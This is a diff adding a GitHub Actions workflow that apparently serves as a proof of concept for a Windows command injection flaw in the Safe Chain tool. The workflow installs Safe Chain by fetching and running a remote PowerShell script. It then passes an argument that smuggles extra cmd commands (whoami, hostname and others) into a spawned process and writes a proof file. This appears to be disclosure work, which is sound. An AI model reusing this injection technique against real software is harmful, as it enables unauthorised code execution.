@@ -1,0 +1,64 @@
+name: Safe Chain Windows Command Injection PoC
+
+on:
+  workflow_dispatch:
+
+jobs:
+  windows-command-injection-poc:
+    name: Windows safeSpawn command injection PoC
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Show runner context
+        shell: pwsh
+        run: |
+          Write-Host "Runner OS: $env:RUNNER_OS"
+          Write-Host "Runner name: $env:RUNNER_NAME"
+          Write-Host "Workspace: $env:GITHUB_WORKSPACE"
+          node --version
+          npm --version
+
+      - name: Install latest Safe Chain release
+        shell: pwsh
+        run: |
+          iex (iwr "https://github.com/AikidoSec/safe-chain/releases/latest/download/install-safe-chain.ps1" -UseBasicParsing)
+          & "$HOME\.safe-chain\bin\safe-chain.exe" --version
+
+      - name: Run command injection PoC
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = "Stop"
+          $safeChainExe = "$HOME\.safe-chain\bin\safe-chain.exe"
+          $proofFile = Join-Path $env:GITHUB_WORKSPACE "safe-chain-ci-rce-proof.txt"
+
+          if (Test-Path $proofFile) {
+            Remove-Item -LiteralPath $proofFile -Force
+          }
+
+          $env:SAFE_CHAIN_CI_POC_PAYLOAD = 'before" & echo SAFE_CHAIN_CI_RCE_CONFIRMED > safe-chain-ci-rce-proof.txt & whoami >> safe-chain-ci-rce-proof.txt & hostname >> safe-chain-ci-rce-proof.txt & cd >> safe-chain-ci-rce-proof.txt & echo %DATE% %TIME% >> safe-chain-ci-rce-proof.txt & echo "after'
+
+          & $safeChainExe npm config get cache $env:SAFE_CHAIN_CI_POC_PAYLOAD --safe-chain-logging=silent
+
+          if (-not (Test-Path $proofFile)) {
+            throw "PoC failed: proof file was not created"
+          }
+
+          $proof = Get-Content -LiteralPath $proofFile -Raw
+          if ($proof -notmatch "SAFE_CHAIN_CI_RCE_CONFIRMED") {
+            throw "PoC failed: proof marker missing"
+          }
+
+          Write-Host "PoC succeeded. Injected commands executed on the Windows CI runner."
+          Write-Host "----- proof file contents -----"
+          Get-Content -LiteralPath $proofFile
+          Write-Host "-------------------------------"
+
+      - name: Upload PoC proof artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: safe-chain-ci-rce-proof
+          path: safe-chain-ci-rce-proof.txt
+          if-no-files-found: error
